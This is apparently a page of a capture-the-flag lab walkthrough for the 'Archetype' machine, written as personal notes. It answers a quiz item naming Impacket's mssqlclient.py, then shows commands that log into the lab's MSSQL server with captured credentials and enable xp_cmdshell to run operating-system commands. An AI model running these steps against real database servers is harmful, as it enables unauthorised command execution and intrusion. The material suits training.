## What script from Impacket collection can be used in order to establish an authenticated connection to a Microsoft SQL Server?

From the **Impacket** collection, the script used to establish an **authenticated connection to a Microsoft SQL Server** is:


> [!Note] Answer
> mssqlclient.py

## Connect to the MSSQL server

#Attakiing_machine 
Connect to the MSSQL server by issuing the following command with the credentials you got on [[Tab 3]].

```
impacket-mssqlclient ARCHETYPE/sql_svc@<MACHINE IP> -windows-auth
```

![[mssql.png]]

You have a MSSQL connection.


## Foothold

#mssqul
1. Check what is the role the user has in the server.

```
SELECT is_srvrolemember('sysadmin');
```

If returns 1 is `sysadmin`.

2. Check if the `xp_cmdshell` is already activated.

```
EXEC xp_cmdshell 'net user';
```

![[xp_cmshell_error.png]]

It's not activated.

3. Proceed with the activation of `xp_cmdshell`.

```
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
sp_configure; - Enabling the sp_configure as stated in the above error message
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
```

![[mssql1.png]]

Now, you are able to execute system commands.



**Next step:** [[Tab 5]]
